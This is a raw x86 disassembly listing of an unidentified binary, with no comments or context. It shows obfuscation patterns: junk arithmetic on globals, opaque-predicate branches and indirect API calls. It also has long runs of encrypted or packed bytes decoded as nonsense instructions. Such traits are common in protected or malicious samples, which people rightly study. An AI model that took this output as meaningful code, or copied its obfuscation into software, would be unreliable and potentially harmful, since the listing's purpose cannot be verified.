  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42840d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x4282dd,0x0
  402b9a:	mov    DWORD PTR ds:0x428481,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x4282e9
  402baa:	mov    DWORD PTR ds:0x4282f5,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x4282f9,0x124b
  402bbf:	mov    DWORD PTR ds:0x4283d1,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x4282dd,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x42849d,edx
  402be7:	and    edx,DWORD PTR ds:0x4283d5
  402bed:	mov    edx,DWORD PTR ds:0x428525
  402bf3:	xor    DWORD PTR ds:0x428475,edx
  402bf9:	mov    edx,DWORD PTR ds:0x428569
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x4283d9,edx
  402c07:	and    DWORD PTR ds:0x4282fd,0x245f
  402c11:	cmp    DWORD PTR ds:0x4282f1,0x0
  402c18:	mov    DWORD PTR ds:0x428491,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x428431,edx
  402c34:	cmp    DWORD PTR ds:0x4282f1,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x4282f1,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x4282f9,0x4284b1
  402c69:	sbb    DWORD PTR ds:0x428495,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x42845d
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x4283b5,edx
  402c81:	xor    DWORD PTR ds:0x428405,0x4283d1
  402c8b:	sbb    DWORD PTR ds:0x428421,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x4283f5,0x0
  402c9f:	mov    DWORD PTR ds:0x428511,0x384
  402ca9:	mov    DWORD PTR ds:0x4282f5,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x4284f9
  402cb9:	mov    DWORD PTR ds:0x4284b1,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x42849d,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x4283f5,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x4284b1,0x612a
  402d00:	sbb    DWORD PTR ds:0x428515,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428515
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x4283b5
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x4284b1,0x0
  402d37:	mov    DWORD PTR ds:0x428419,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x4283dd
  402d47:	mov    edx,DWORD PTR ds:0x4284ad
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428401,0x114
  402d5c:	cmp    DWORD PTR ds:0x4284b1,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428509
  402d79:	or     DWORD PTR ds:0x4283e9,ebx
  402d7f:	sub    DWORD PTR ds:0x4284ad,ecx
  402d85:	mov    edx,DWORD PTR ds:0x4284fd
  402d8b:	xor    DWORD PTR ds:0x42849d,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x4282ed
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x4283e9,0x4283c9
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x4284b1
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428431
  402dc2:	xor    DWORD PTR ds:0x42849d,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428421,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x4283c1,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x4284dd
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x428569
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428521,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x4283bd,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42852d,0x0
  402e23:	mov    DWORD PTR ds:0x42841d,ebx
  402e29:	mov    DWORD PTR ds:0x428421,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x4283c9
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x4283ed,0x5c7
  402e49:	mov    DWORD PTR ds:0x42842d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42852d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428301,0x7db0
  402e73:	sub    DWORD PTR ds:0x428531,ecx
  402e79:	adc    DWORD PTR ds:0x4283bd,edx
  402e7f:	and    edx,DWORD PTR ds:0x428499
  402e85:	mov    edx,DWORD PTR ds:0x42834d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42831d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428401
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x428499,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	dec    ebp
  402eba:	mov    ecx,0xe0bd924c
  402ebf:	mov    esi,0xbec4bdbe
  402ec4:	mov    esi,0xdaf389d7
  402ec9:	jle    0x402ea2
  402ecb:	scas   eax,DWORD PTR es:[edi]
  402ecc:	dec    edx
  402ecd:	imul   ecx,ecx,0x468ba65c
  402ed3:	(bad)  
  402ed4:	rcr    edi,cl
  402ed6:	mov    ds:0x46ba7d18,eax
  402edb:	xchg   esp,eax
  402edc:	aaa    
  402edd:	fpatan 
  402edf:	in     al,dx
  402ee0:	mov    eax,ds:0x6b10a95b
  402ee5:	jge    0x402edf
  402ee7:	(bad)  
  402ee8:	lea    esi,[eax+edi*8]
  402eeb:	jl     0x402f3c
  402eed:	cli    
  402eee:	xor    DWORD PTR [edx+eax*1+0x19],eax
  402ef2:	jo     0x402f2a
  402ef4:	(bad)
  402ef8:	mov    WORD PTR gs:[ecx+0x49],ds
  402efc:	retf   
  402efd:	xchg   DWORD PTR [ebx+ebx*8],esi
  402f00:	xchg   ecx,eax
  402f01:	jmp    0x402eff
  402f03:	push   esp
  402f04:	or     al,0x55
  402f06:	add    al,BYTE PTR [esi+0x407dd608]
  402f0c:	in     eax,0x97
  402f0e:	into   
  402f0f:	pop    edi
  402f10:	push   esi
  402f11:	retf   
  402f12:	and    BYTE PTR [eax+0x24],bl
  402f15:	shr    ecx,0xa2
  402f18:	hlt    
  402f19:	jae    0x402eb5
  402f1b:	sti    
  402f1c:	shl    BYTE PTR [edx],0x3e
  402f1f:	frstor [edx+0x1c1eeb10]
  402f25:	retf   
  402f26:	pop    ebx
  402f27:	jae    0x402ece
  402f29:	(bad)  
  402f2a:	cwde   
  402f2b:	or     al,0xeb
  402f2d:	sbb    edi,ebx
  402f2f:	fnsave [esi]
  402f31:	pushf  
  402f32:	mov    bh,0x2e
  402f34:	aad    0x98
  402f36:	out    dx,eax
  402f37:	lock fisubr WORD PTR [esi-0x6afa6a84]
  402f3e:	dec    ecx
  402f3f:	mov    ebp,0x9832ce5d
  402f44:	or     BYTE PTR [ebx+0xe],0xb0
  402f48:	mov    BYTE PTR [edi-0x18e05b62],al
  402f4e:	fdiv   st,st(7)
  402f50:	add    DWORD PTR [esi],ebp
  402f52:	xchg   edi,eax
  402f53:	shl    al,0x3d
  402f56:	frstor [edi]
  402f58:	pusha  
  402f59:	push   ebx
  402f5a:	push   ebp
  402f5b:	mov    WORD PTR [di+0x39],cs
  402f5f:	aas    
  402f60:	sbb    BYTE PTR [esi-0xa01208c],0x66
  402f67:	and    bl,BYTE PTR [ecx+0x63]
  402f6a:	scas   al,BYTE PTR es:[edi]
  402f6b:	lahf   
  402f6c:	cld    
  402f6d:	ror    al,cl
  402f6f:	fucom  st(5)
  402f71:	push   edi
  402f72:	push   es
  402f73:	sbb    eax,0x53a6f1f9
  402f78:	hlt    
  402f79:	adc    BYTE PTR [edx+0x7f],cl
  402f7c:	fs mov dh,0xc8
  402f7f:	pop    edx
  402f80:	xchg   ebx,eax
  402f81:	push   esi
  402f82:	or     al,0xe0
  402f84:	loop   0x402fbd
  402f86:	dec    ecx
  402f87:	mov    al,BYTE PTR [edi]
  402f89:	rcr    cl,1
  402f8b:	std    
  402f8c:	jl     0x402f59
  402f8e:	ja     0x402fae
  402f90:	push   ebp
  402f91:	das    
  402f92:	fistp  DWORD PTR [esi+0x75c38342]
  402f98:	bound  edx,QWORD PTR [ecx+edi*1]
  402f9b:	mov    eax,ds:0x2460fa2e
  402fa0:	ficom  DWORD PTR ds:0x3d8985c5
  402fa6:	lods   eax,DWORD PTR ds:[esi]
  402fa7:	neg    BYTE PTR [ebp+0x60]
  402faa:	inc    edx
  402fab:	jge    0x402f6d
  402fad:	das    
  402fae:	aad    0x8c
  402fb0:	fs es out dx,eax
  402fb3:	or     dh,BYTE PTR [ebx+0x32995de6]
  402fb9:	outs   dx,DWORD PTR ds:[esi]
  402fba:	xor    bl,BYTE PTR [edx]
  402fbc:	xchg   ecx,eax
  402fbd:	ins    DWORD PTR es:[edi],dx
  402fbe:	sbb    BYTE PTR [esi+0x52],bh
  402fc1:	and    BYTE PTR [ebx+0x2f],cl
  402fc4:	lea    ecx,[esp+eiz*2+0x5e0157a8]
  402fcb:	repnz or bh,bh
  402fce:	push   ss
  402fcf:	adc    DWORD PTR [esp+esi*1],0xffffffb9
  402fd3:	js     0x402fb8
  402fd5:	ins    BYTE PTR es:[edi],dx
  402fd6:	into   
  402fd7:	mov    ch,0xb6
  402fd9:	cmp    DWORD PTR [bx+si+0x5f],eax
  402fdd:	mov    dh,0x79
  402fdf:	mov    ebx,0x6ae345b3
  402fe4:	adc    eax,DWORD PTR [edi]
  402fe6:	mov    ebp,esi
  402fe8:	(bad)  
  402fe9:	fld    QWORD PTR [ebp+0x28]
  402fec:	xor    DWORD PTR [ecx-0x69],ebp
  402fef:	gs push ebx
  402ff1:	in     al,0x14
  402ff3:	jbe    0x403021
  402ff5:	lahf   
  402ff6:	jnp    0x40300a
  402ff8:	sbb    cl,BYTE PTR [edx-0x7470a441]
  402ffe:	dec    ebx
  402fff:	jbe    0x402fdd
  403001:	xor    dh,cl
  403003:	fwait
  403004:	mov    ecx,0x8c861bbb
  403009:	stos   DWORD PTR es:[edi],eax
  40300a:	push   ss
  40300b:	stos   DWORD PTR es:[edi],eax
  40300c:	pop    es
  40300d:	gs mov ecx,0x1c37f0ba
  403013:	or     eax,0xed1e6dd3
  403018:	(bad)  
  40301a:	adc    al,0x53
  40301c:	loopne 0x403011
  40301e:	dec    edi
  40301f:	mov    edi,0xd90fc1e9
  403024:	mov    eax,ds:0xdbc70d0f
  403029:	sbb    esp,ebp
  40302b:	mov    esi,0xe0f5a32e
  403030:	adc    BYTE PTR [ecx+ebp*2],dh
  403033:	(bad)  [ebx-0x1f]
  403036:	adc    eax,0xdc9d00e0
  40303b:	and    esp,DWORD PTR [edx]
  40303d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303e:	stc    
  40303f:	xor    BYTE PTR ds:0x6db79aa0,0xbe
  403046:	jmp    0xac749e99
  40304b:	(bad)  
  40304c:	(bad)  
  40304d:	clc    
  40304e:	xor    al,0x2b
  403050:	ret    0x5e20
  403053:	dec    esp
  403054:	or     esi,DWORD PTR [ebp+0xb]
  403057:	xchg   ebp,eax
  403058:	sub    eax,0xad572780
  40305d:	in     eax,0x28
  40305f:	and    ah,BYTE PTR [eax-0x791b6555]
  403065:	xchg   DWORD PTR [ebp+0xb],esp
  403068:	xor    eax,0x29eda83f
  40306d:	pusha  
  40306e:	jl     0x403017
  403070:	sub    DWORD PTR [eax+0x24],edx
  403073:	stc    
  403074:	inc    esi
  403075:	(bad)  
  403077:	mov    ch,0xbe
  403079:	cmp    al,0x3e
  40307b:	pop    ss
  40307c:	loop   0x40300c
  40307e:	adc    ecx,edx
  403080:	pusha  
  403081:	sub    BYTE PTR [ebp+0x13ef7ab2],0x47
  403088:	mov    bh,0xdc
  40308a:	jno    0x4030c2
  40308c:	push   esp
  40308d:	popf   
  40308e:	inc    esi
  40308f:	jmp    0x43a7aa03
  403094:	in     al,dx
  403095:	mov    al,ah
  403097:	mov    dh,0xe6
  403099:	les    eax,FWORD PTR [edx-0x68]
  40309c:	retf   0x3424
  40309f:	lods   eax,DWORD PTR ds:[esi]
  4030a0:	pop    esi
  4030a1:	outs   dx,BYTE PTR ds:[esi]
  4030a2:	jne    0x403064
  4030a4:	sub    ebx,DWORD PTR [edi+0x13]
  4030a7:	adc    al,0xb2
  4030a9:	repz jnp 0x40302e
  4030ac:	out    dx,al
  4030ad:	add    ecx,0xc15d9984
  4030b3:	test   DWORD PTR [edx+ebp*1],edx
  4030b6:	inc    ecx
  4030b7:	xchg   DWORD PTR [esi+0x37317f17],esp
  4030bd:	xchg   ecx,eax
  4030be:	jmp    0x403123
  4030c0:	fcmovu st,st(4)
  4030c2:	outs   dx,BYTE PTR ds:[esi]
  4030c3:	pop    ebp
  4030c4:	jmp    0x764e2289
  4030c9:	pop    es
  4030ca:	dec    esp
  4030cb:	aas    
  4030cc:	cmp    al,0xde
  4030ce:	out    dx,al
  4030cf:	push   es
  4030d0:	inc    esp
  4030d1:	xchg   ecx,eax
  4030d2:	sub    ebp,DWORD PTR [ebx+0x42]
  4030d5:	popa   
  4030d6:	add    ax,0x5d9f
  4030da:	mov    edi,0xc0a00b2b
  4030df:	and    edi,edx
  4030e1:	fcmovnb st,st(2)
  4030e3:	dec    edi
  4030e4:	mov    ebp,0xd0bd2330
  4030e9:	push   ss
  4030ea:	gs xchg edx,eax
  4030ec:	lds    edi,FWORD PTR ds:0xcbd38e96
  4030f2:	jecxz  0x403125
  4030f4:	xchg   DWORD PTR [eax-0xa2ac5fb],ebp
  4030fa:	mov    esi,0xc7b60228
  4030ff:	xchg   ebp,eax
  403100:	in     al,0x47
  403102:	sbb    BYTE PTR [ebx],dl
  403104:	jmp    0xa578:0xfea7dd23
  40310b:	dec    esi
  40310c:	leave  
  40310d:	sar    BYTE PTR [edi+0x48825317],1
  403113:	mul    BYTE PTR [eax]
  403115:	les    ecx,FWORD PTR [ecx-0x14]
  403118:	push   ss
  403119:	dec    esi
  40311a:	lds    edx,FWORD PTR [edi+ecx*2]
  40311d:	xor    BYTE PTR [eax+0x4b7dd237],bl
  403123:	and    BYTE PTR [esi],dh
  403125:	jmp    0x403135
  403127:	mov    esi,0x26b7c116
  40312c:	in     eax,dx
  40312d:	retf   
  40312e:	fucom  st(0)
  403130:	das    
  403131:	add    al,0x92
  403133:	dec    ecx
  403134:	push   esp
  403135:	popf   
  403136:	inc    edi
  403137:	out    dx,al
  403138:	mov    cs,WORD PTR [edx-0x17]
  40313b:	mov    WORD PTR [ebx-0x27],fs
  40313e:	leave  
  40313f:	mov    cl,0x3
  403141:	out    0xac,eax
  403143:	pop    edi
  403144:	call   0xe883:0x80101dd3
  40314b:	jl     0x403102
  40314d:	sbb    al,0xbf
  40314f:	add    BYTE PTR [ebp+0x6d],ch
  403152:	je     0x403198
  403154:	pop    edx
  403155:	scas   eax,DWORD PTR es:[edi]
  403156:	test   DWORD PTR ds:0x2c845729,edx
  40315c:	outs   dx,BYTE PTR ds:[esi]
  40315d:	adc    ecx,DWORD PTR [ebx-0x1b]
  403160:	mov    eax,0xc5166887
  403165:	call   0x16ea9c66
  40316a:	mov    dh,0x1a
  40316c:	out    dx,al
  40316d:	rol    BYTE PTR [esi+edi*8+0x72c5d6ce],0xbe
  403175:	sbb    eax,0x89c94fa0
  40317a:	add    eax,0x9daeb132
  40317f:	jmp    0xa8489f47
  403184:	mov    ah,0xcd
  403186:	fs in  al,0xbc
  403189:	std    
  40318a:	mov    ecx,0x8f4c9bb
  40318f:	mov    dh,0xda
  403191:	int3   
  403192:	icebp  
  403193:	(bad)  
  403194:	js     0x40314b
  403196:	stos   BYTE PTR es:[edi],al
  403197:	jmp    0xecda48b9
  40319c:	(bad)  
  40319d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319e:	dec    esp
  40319f:	sbb    al,0xe9
  4031a1:	es xchg edi,eax
  4031a3:	xor    ebp,edx
  4031a5:	(bad)  
  4031a6:	and    BYTE PTR [esi],dl
  4031a8:	outs   dx,BYTE PTR ds:[esi]
  4031a9:	aas    
  4031aa:	jb     0x40320a
  4031ac:	sbb    DWORD PTR gs:[edx],eax
  4031af:	(bad)  
  4031b0:	fnstcw WORD PTR [edi]
  4031b2:	(bad)  
  4031b3:	ss out 0xd6,eax
  4031b6:	mov    esi,0x1a2493bf
  4031bb:	jne    0x4031aa
  4031bd:	lods   eax,DWORD PTR ds:[esi]
  4031be:	fsubr  DWORD PTR [eax+edx*4+0x7749b49d]
  4031c5:	mov    eax,ds:0x3eba5cc0
  4031ca:	and    ebx,DWORD PTR [eax+0x45]
  4031cd:	fld    DWORD PTR [esi-0x1e4a51b8]
  4031d3:	sbb    ebx,ecx
  4031d5:	ret    0xa53a
  4031d8:	rcr    ecx,1
  4031da:	xor    al,0xa3
  4031dc:	sub    eax,DWORD PTR [ecx+0x73]
  4031df:	mov    esi,0x4ab53c6b
  4031e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e5:	add    eax,0x6f225e1c
  4031ea:	rcl    al,cl
  4031ec:	inc    ecx
  4031ed:	lods   eax,DWORD PTR ds:[esi]
  4031ee:	push   ebp
  4031ef:	xchg   esp,eax
  4031f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f1:	ficomp DWORD PTR [edx]
  4031f3:	cmp    eax,0xffffffd0
  4031f6:	and    BYTE PTR [edx+0x52],dl
  4031f9:	dec    esp
  4031fa:	jl     0x4031e9
  4031fc:	fbstp  TBYTE PTR [edi]
  4031fe:	xchg   edi,eax
  4031ff:	aas    
  403200:	cmp    al,0xc3
  403202:	pop    ecx
  403203:	ret    0xeaf3
  403206:	dec    edi
  403207:	cli    
  403208:	cld    
  403209:	aad    0x2c
  40320b:	cmp    cl,BYTE PTR ds:0x31c46108
  403211:	xchg   BYTE PTR [ecx-0x56],bl
  403214:	pop    ecx
  403215:	inc    eax
  403216:	push   cs
  403217:	mov    cl,BYTE PTR [eax-0x241b84ff]
  40321d:	push   eax
  40321e:	xor    eax,0x8e93b8e3
  403223:	shr    DWORD PTR [ebp-0x6f],1
  403226:	mov    eax,ds:0xd1947de9
  40322b:	dec    edi
  40322c:	mov    ah,0x90
  40322e:	ror    DWORD PTR [ecx],cl
  403230:	nop
  403231:	inc    edx
  403232:	ja     0x4032a6
  403234:	outs   dx,DWORD PTR ds:[esi]
  403235:	pop    edi
  403236:	pop    edi
  403237:	leave  
  403238:	mov    esi,ecx
  40323a:	in     al,dx
  40323b:	(bad)  
  40323c:	lods   al,BYTE PTR ds:[esi]
  40323d:	push   es
  40323e:	dec    esp
  40323f:	shl    BYTE PTR [ebx-0x7c21723],cl
  403245:	fcom   DWORD PTR [esi+0x6f]
  403248:	mov    edx,DWORD PTR ss:[ebx+0x4]
  40324c:	xor    DWORD PTR [ebp-0x1c],edi
  40324f:	sub    DWORD PTR ds:0x428489,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428529,0x42830d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428409
  40326f:	xor    DWORD PTR ds:0x4283bd,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x4284a9,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x428479,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428505,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42850d,0x0
  4032b7:	mov    DWORD PTR ds:0x4284a1,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x4283b5
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42830d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42850d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x4283cd
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x428485,0x290
  403302:	sbb    DWORD PTR ds:0x4283c1,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x4284a1,0x0
  403312:	mov    edx,DWORD PTR ds:0x4283e1
  403318:	mov    DWORD PTR ds:0x42847d,0x501f
  403322:	mov    edx,DWORD PTR ds:0x428481
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428325,0x1634
  403337:	mov    DWORD PTR ds:0x428499,0xaef
  403341:	cmp    DWORD PTR ds:0x4284a1,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x4283e1,0x42842d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x4283c1
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x428499
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428315,0x428489
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x4282e5,0x428405
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x4283fd,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x4282ed,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x4283b9,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428519,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428311
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428521,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x4283e9,0x4283e1
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428315,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x4283c5,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x4284ad,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x428481,0x0
  403427:	mov    DWORD PTR ds:0x428511,0xe2a
  403431:	mov    DWORD PTR ds:0x4282f9,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428525,0xfd5
  40344b:	mov    DWORD PTR ds:0x4283f9,ecx
  403451:	cmp    DWORD PTR ds:0x428481,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428217
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x4283dd
  403489:	sub    edx,DWORD PTR ds:0x428495
  40348f:	mov    DWORD PTR ds:0x4283dd,edx
  403495:	mov    DWORD PTR ds:0x428311,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42831d
  4034a5:	mov    edx,DWORD PTR ds:0x42852d
  4034ab:	and    DWORD PTR ds:0x4283e5,edx
  4034b1:	inc    DWORD PTR ds:0x4282dd
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x4282f5,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x4284f9,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x4283d9,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x428491,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428431,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428419,0x42849d
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x4282f9,0x428311
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x4282f1,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x4284a1,0x428421
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x4283fd,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fnstsw WORD PTR [ebx-0x4122cf98]
  40355a:	call   0xc4fdf41d
  40355f:	mov    esi,0x80525dbe
  403564:	mov    WORD PTR [eax-0x3fe687cb],?
  40356a:	fxam   
  40356c:	push   0xffffff81
  40356e:	jnp    0x4035d2
  403570:	rol    BYTE PTR [edx],1
  403572:	pop    ebx
  403573:	enter  0xc84f,0x78
  403577:	push   esi
  403578:	inc    edi
  403579:	sub    DWORD PTR [edx-0x53ca9ea5],eax
  40357f:	lds    edx,FWORD PTR [ecx+0x27]
  403582:	adc    eax,0x404d272
  403587:	mov    edi,0xbe409ef0
  40358c:	add    BYTE PTR [eax+0x249f292d],dh
  403592:	shl    BYTE PTR [ecx-0x5d581547],1
  403598:	nop
  403599:	mov    DWORD PTR [esi],ebp
  40359b:	scas   eax,DWORD PTR es:[edi]
  40359c:	push   ebx
  40359d:	mov    eax,ds:0x4cefa501
  4035a2:	outs   dx,BYTE PTR ds:[esi]
  4035a3:	inc    ecx
  4035a4:	and    al,0x3d
  4035a6:	push   ecx
